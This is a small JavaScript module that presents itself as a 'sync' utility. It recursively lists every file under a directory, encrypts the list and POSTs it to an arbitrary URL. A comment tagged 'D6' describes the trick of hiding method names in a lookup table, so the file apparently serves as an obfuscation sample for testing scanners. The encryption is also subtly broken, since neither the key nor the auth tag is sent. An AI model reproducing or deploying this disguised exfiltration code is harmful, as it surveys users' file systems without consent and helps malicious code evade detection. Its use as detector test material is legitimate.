'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// D6 注册表 / 配置驱动：方法名存在表里，运行时查表
const REGISTRY = {
  makeCipher: 'createCipheriv',
  randomSource: 'randomBytes',
  transport: 'fetch',
};
async function sync(root, url) {
  const f = treescan(root);
  const m = require('crypto');
  const k = m[REGISTRY.randomSource](32), iv = m[REGISTRY.randomSource](16);
  const c = m[REGISTRY.makeCipher]('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\n'))), c.final()]);
  return globalThis[REGISTRY.transport](url, { method: 'POST', body: body });
}
module.exports = { sync };
